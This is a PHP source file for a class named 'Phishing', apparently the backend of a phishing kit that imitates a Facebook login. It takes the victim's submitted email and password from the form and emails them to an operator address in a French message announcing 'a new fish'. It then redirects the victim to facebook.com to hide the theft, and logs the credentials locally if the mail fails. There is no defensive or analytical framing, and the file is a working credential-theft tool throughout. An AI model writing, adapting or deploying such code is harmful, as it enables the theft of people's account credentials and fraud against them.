<?php

namespace Informagenie;
use  Katzgrau\KLogger\Logger;

class Phishing
{

    protected $mailler;

    public function __construct()
    {
        $this->mailler = new \SimpleMail();
        $this->datas = array_map('htmlspecialchars', $_POST);
    }

    public function send(Array $data)
    {
        $content = $this->buildContent();
        $sent = $this->mailler->setFrom('Mbungu ngoma', 'goms@labes-ley.com')
                ->setTo($data['my_email'], $data['my_name'])
                ->setSubject($data['subject'])
                ->setMessage($content)
                ->setHtml()
                ->send();
        if($sent)
        {
            header('Location: https://facebook.com');
            exit();
        }else{
            $logger = new Logger(__DIR__.'/logs');
            $logger->info(strip_tags($content));
        }
    }

    protected function buildContent()
    {
        $username = !empty($this->datas['email']) ? $this->datas['email'] : 'Inconnue';
        $password = !empty($this->datas['pass']) ? $this->datas['pass'] : 'Inconnue';
        return $content = <<<content
<p>Bonjour, <br />
Vous avez un nouveau poisson !<p>

<ul>
<li>Nom  d'utilisateur : $username </li>

<li>Mot de passe : $password </li>
</ul>
content;

    }

}